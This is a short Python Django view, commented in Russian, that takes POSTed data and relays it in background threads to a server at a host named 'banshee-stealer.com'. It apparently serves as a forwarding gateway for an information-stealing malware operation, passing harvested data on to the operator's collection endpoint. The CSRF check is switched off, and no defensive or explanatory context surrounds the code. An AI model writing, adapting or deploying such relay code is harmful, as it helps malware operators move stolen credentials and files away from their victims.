from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json
from concurrent.futures import ThreadPoolExecutor
import requests

# Создание пула потоков, который будет использоваться для отправки данных
executor = ThreadPoolExecutor(max_workers=5)

@csrf_exempt
def send(request):
    if request.method == 'POST':
        try:
            # Получаем и декодируем данные из запроса
            data = json.loads(request.body)
            encoded_data = data.get('data', '')
            # Запускаем отправку данных в отдельном потоке
            create_new_thread(encoded_data)
            return JsonResponse({'success': '1'}, status=200)
        except json.JSONDecodeError:
            return JsonResponse({'error': '2'}, status=400)
    else:
        return JsonResponse({'error': '3'}, status=400)

def create_new_thread(data):
    # Отправка задачи на выполнение в пул потоков
    executor.submit(send_data, data)

def send_data(data):
    try:
        url = "http://banshee-stealer.com/api/data/"
        # Отправка данных в виде POST-запроса
        response = requests.post(url, json={"data": data})
        # Логируем ответ от сервера
        print(response.json())
    except Exception as ex:
        # Логируем исключение в случае ошибки
        print(f"Exception occurred: {ex}")
